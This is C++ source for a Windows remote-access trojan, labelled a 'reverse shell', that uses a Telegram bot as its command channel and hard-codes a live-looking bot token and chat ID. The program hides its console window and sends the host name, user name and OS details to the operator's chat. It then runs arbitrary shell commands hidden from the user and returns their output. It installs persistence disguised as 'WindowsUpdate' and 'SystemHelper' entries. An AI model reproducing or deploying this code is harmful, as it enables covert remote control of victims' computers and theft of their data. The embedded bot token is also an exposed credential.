#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <iostream>
#include <random>
#include <regex>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace fs = std::filesystem;

// Telegram Bot Token
const std::string BOT_TOKEN = "8287384565:AAE-wh4B_eeTDQBeyf_m5e9am9nbQKHBzbE";
const std::string CHAT_ID = "7369364451";
const std::string API_URL = "https://api.telegram.org/bot";

class StringUtils {
public:
    static std::string base64Encode(const std::vector<BYTE>& data) {
        DWORD size = 0;
        CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()), 
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
        
        std::string result(size, 0);
        CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()),
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            (LPSTR)result.data(), &size);
        
        return result;
    }
    
    static std::string urlEncode(const std::string& str) {
        std::string encoded;
        char hex[] = "0123456789ABCDEF";
        
        for (unsigned char c : str) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                encoded += c;
            } else {
                encoded += '%';
                encoded += hex[c >> 4];
                encoded += hex[c & 0xF];
            }
        }
        return encoded;
    }
    
    static std::string trim(const std::string& str) {
        size_t first = str.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) return "";
        size_t last = str.find_last_not_of(" \t\r\n");
        return str.substr(first, last - first + 1);
    }
};

class SystemInfo {
public:
    static std::string getAllInfo() {
        std::stringstream ss;
        
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        
        char username[256];
        size = sizeof(username);
        GetUserNameA(username, &size);
        
        MEMORYSTATUSEX ms = {0};
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        
        OSVERSIONINFOEXA osvi = {0};
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((LPOSVERSIONINFOA)&osvi);
        
        ss << "📱 **System Info**\n";
        ss << "Host: " << hostname << "\n";
        ss << "User: " << username << "\n";
        ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        ss << " (Build " << osvi.dwBuildNumber << ")\n";
        ss << "RAM: " << ms.ullTotalPhys / (1024 * 1024) << " MB\n";
        
        return ss.str();
    }
};

class TelegramBot {
private:
    std::string token;
    std::string chat_id;
    
    std::string httpRequest(const std::string& method, const std::string& postData = "") {
        std::string url = API_URL + token + "/" + method;
        std::string response;
        
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", 
            INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        if (hConnect) {
            std::string urlPath = "/bot" + token + "/" + method;
            HINTERNET hRequest = HttpOpenRequestA(hConnect, postData.empty() ? "GET" : "POST", 
                urlPath.c_str(), "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                if (postData.empty()) {
                    HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
                } else {
                    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                    HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                        (LPVOID)postData.c_str(), postData.length());
                }
                
                char buffer[4096];
                DWORD bytesRead;
                while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                    response.append(buffer, bytesRead);
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
public:
    TelegramBot(const std::string& botToken, const std::string& targetChatId) 
        : token(botToken), chat_id(targetChatId) {}
    
    bool sendMessage(const std::string& message) {
        std::string postData = "chat_id=" + chat_id + "&text=" + StringUtils::urlEncode(message) + 
            "&parse_mode=Markdown";
        std::string response = httpRequest("sendMessage", postData);
        return response.find("\"ok\":true") != std::string::npos;
    }
    
    bool sendFile(const std::string& filename, const std::vector<BYTE>& data) {
        std::string encoded = StringUtils::base64Encode(data);
        std::string message = "📁 File: " + filename + "\n\n[Base64 encoded]\n" + 
            encoded.substr(0, 3000) + (encoded.length() > 3000 ? "..." : "");
        return sendMessage(message);
    }
    
    std::vector<std::string> getCommands() {
        std::vector<std::string> commands;
        std::string response = httpRequest("getUpdates?timeout=5");
        
        size_t pos = 0;
        std::string textMarker = "\"text\":\"";
        while ((pos = response.find(textMarker, pos)) != std::string::npos) {
            pos += textMarker.length();
            size_t end = response.find("\"", pos);
            if (end != std::string::npos) {
                std::string cmd = response.substr(pos, end - pos);
                
                // Escape handling
                std::string cleanCmd;
                for (size_t i = 0; i < cmd.length(); i++) {
                    if (cmd[i] == '\\' && i + 1 < cmd.length()) {
                        if (cmd[i + 1] == 'n') cleanCmd += '\n';
                        else if (cmd[i + 1] == 'r') cleanCmd += '\r';
                        else if (cmd[i + 1] == 't') cleanCmd += '\t';
                        else cleanCmd += cmd[i + 1];
                        i++;
                    } else {
                        cleanCmd += cmd[i];
                    }
                }
                
                commands.push_back(cleanCmd);
            }
        }
        
        return commands;
    }
};

class Persistence {
private:
    std::string getExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
public:
    bool installUserPersistence() {
        HKEY hKey;
        std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        std::string valueName = "WindowsUpdate_" + std::to_string(GetCurrentProcessId());
        std::string exePath = getExePath();
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, 
                (const BYTE*)exePath.c_str(), exePath.length() + 1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    bool installStartupFolder() {
        char startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::string linkPath = std::string(startupPath) + "\\SystemHelper.lnk";
            std::string exePath = getExePath();
            
            CoInitialize(NULL);
            IShellLinkA* psl;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                IID_IShellLinkA, (void**)&psl))) {
                
                psl->SetPath(exePath.c_str());
                psl->SetDescription("System Helper");
                
                IPersistFile* ppf;
                if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
                    std::wstring wpath(linkPath.begin(), linkPath.end());
                    ppf->Save(wpath.c_str(), TRUE);
                    ppf->Release();
                }
                psl->Release();
            }
            CoUninitialize();
            return true;
        }
        return false;
    }
};

class CommandExecutor {
public:
    static std::string execute(const std::string& cmd) {
        std::string result;
        char buffer[4096];
        
        // Use CREATE_NO_WINDOW flag to prevent console window from showing
        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        CreatePipe(&hRead, &hWrite, &sa, 0);
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;  // Hide the window
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.hStdInput = NULL;
        
        PROCESS_INFORMATION pi = {0};
        
        // Use cmd.exe with /c to execute command
        std::string fullCmd = "cmd.exe /c " + cmd;
        
        if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, 
            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
            
            CloseHandle(hWrite);
            
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            
            WaitForSingleObject(pi.hProcess, 5000); // Wait up to 5 seconds
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            result = "Failed to execute command";
        }
        
        CloseHandle(hRead);
        
        if (result.empty()) {
            result = "[Command executed with no output]";
        }
        
        return result;
    }
};

class ReverseShell {
private:
    TelegramBot bot;
    Persistence persistence;
    bool running;
    std::thread listenerThread;
    
    void processCommand(const std::string& cmd) {
        std::string trimmed = StringUtils::trim(cmd);
        
        if (trimmed == "/help") {
            std::string help = 
                "📚 **Commands**\n"
                "/info - System info\n"
                "/shell <cmd> - Execute command\n"
                "/persist - Install persistence\n"
                "/exit - Exit shell";
            bot.sendMessage(help);
        }
        else if (trimmed == "/info") {
            bot.sendMessage(SystemInfo::getAllInfo());
        }
        else if (trimmed == "/persist") {
            bool reg = persistence.installUserPersistence();
            bool startup = persistence.installStartupFolder();
            bot.sendMessage("Persistence installed: Registry=" + std::string(reg ? "OK" : "Fail") + 
                ", Startup=" + std::string(startup ? "OK" : "Fail"));
        }
        else if (trimmed.find("/shell ") == 0) {
            std::string command = trimmed.substr(7);
            bot.sendMessage("⚙️ Executing: `" + command + "`");
            std::string output = CommandExecutor::execute(command);
            
            if (output.length() > 4000) {
                output = output.substr(0, 4000) + "\n... (truncated)";
            }
            bot.sendMessage("```\n" + output + "\n```");
        }
        else if (trimmed == "/exit") {
            bot.sendMessage("👋 Exiting...");
            running = false;
            ExitProcess(0);
        }
    }
    
    void listener() {
        int lastCommandCount = 0;
        
        while (running) {
            try {
                auto commands = bot.getCommands();
                
                if (commands.size() > lastCommandCount) {
                    for (size_t i = lastCommandCount; i < commands.size(); i++) {
                        processCommand(commands[i]);
                    }
                    lastCommandCount = commands.size();
                }
                
                std::this_thread::sleep_for(std::chrono::seconds(2));
            } catch (...) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
    
public:
    ReverseShell(const std::string& token, const std::string& chatId) 
        : bot(token, chatId), running(false) {}
    
    void start() {
        running = true;
        
        // Hide console window immediately
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
        
        // Also hide from taskbar
        SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        ShowWindow(hWnd, SW_HIDE);
        
        // Send initial notification
        bot.sendMessage("✅ **Reverse Shell Active**\n" + SystemInfo::getAllInfo() + "\nType /help for commands");
        
        // Start listener
        listenerThread = std::thread(&ReverseShell::listener, this);
    }
    
    void stop() {
        running = false;
        if (listenerThread.joinable()) {
            listenerThread.join();
        }
    }
};

// Function to detach from console completely
void DetachFromConsole() {
    FreeConsole();
    
    // Also detach if it's a GUI app
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
        FreeConsole();
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Detach from console completely
    DetachFromConsole();
    
    // If compiled as GUI app, this should already be hidden, but just in case
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
        FreeConsole();
    }
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    
    // Start reverse shell
    ReverseShell shell(BOT_TOKEN, CHAT_ID);
    shell.start();
    
    // Message loop (doesn't create visible window)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    WSACleanup();
    return 0;
}
